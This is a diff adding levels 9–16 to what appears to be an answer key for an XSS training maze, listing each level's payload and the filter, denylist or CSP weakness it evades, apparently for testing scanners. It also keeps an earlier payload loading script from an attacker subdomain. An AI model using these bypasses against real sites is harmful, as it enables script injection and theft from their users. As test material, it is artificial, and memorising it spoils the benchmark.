@@ -59,3 +59,60 @@ Modern real-world XSS bypasses: multi-step state, DOM clobbering config, Vue.js 
 
 - payload: `https://xssmaze.com.attacker.com/malicious.js`
 - context: Flawed domain regex whitelist prefix check lacks proper anchors/slashes, allowing attacker subdomains starting with whitelist domain.
+
+### modern-bypass-level9
+
+`/modern-bypass/level9/?query=onload/onerror=alert(1)`
+
+- payload: `onload/onerror=alert(1)`
+- context: Unquoted image attribute context where all whitespace is stripped. Scanner must use `/` (slash) as an attribute separator instead of space.
+
+### modern-bypass-level10
+
+`/modern-bypass/level10/?query=%27%3E%3C/option%3E%3C/select%3E%3Csvg/onload=alert(1)%3E`
+
+- payload: `'/></option></select><svg/onload=alert(1)>`
+- context: Nested select/option single-quoted attribute breakout using a single quote.
+
+### modern-bypass-level11
+
+`/modern-bypass/level11/?query=alert(1)`
+
+- payload: `alert(1)`
+- context: Style block close tag blocked by WAF; payload reflected as a CSS custom variable value evaluated as plain JS by page script.
+
+### modern-bypass-level12
+
+`/modern-bypass/level12/?query=alert(1)`
+
+- payload: `alert(1)`
+- context: CSP restricts scripts but whitelists Google API CDN; bypassed by passing a JSONP script callback payload.
+
+### modern-bypass-level13
+
+`/modern-bypass/level13/?query=M%2010%2010%20xss:alert(1)`
+
+- payload: `M 10 10 xss:alert(1)`
+- context: Reflected inside SVG path attribute value; client-side JS custom SVG parser extracts `xss:` action and evaluates it.
+
+### modern-bypass-level14
+
+`/modern-bypass/level14/?query=%22%20onpointerover=alert(1)%20x=%22`
+
+- payload: `" onpointerover=alert(1) x="`
+- context: Standard event handlers (onload, onerror, etc.) blocked by strict event denylist; bypass requires obscure HTML5 events like `onpointerover`.
+
+### modern-bypass-level15
+
+`/modern-bypass/level15/?query=%27%20onerror=%27alert(1)`
+
+- payload: `' onerror='alert(1)`
+- context: Reflected inside single-quoted data-attribute JSON. Double quotes are escaped, but single quotes are not, allowing attribute breakout.
+
+### modern-bypass-level16
+
+`/modern-bypass/level16/?query=alert(1)`
+
+- payload: `alert(1)`
+- context: Double reflection. First is HTML-escaped inside a single-quoted JS string, but the second is unquoted raw JS.
+
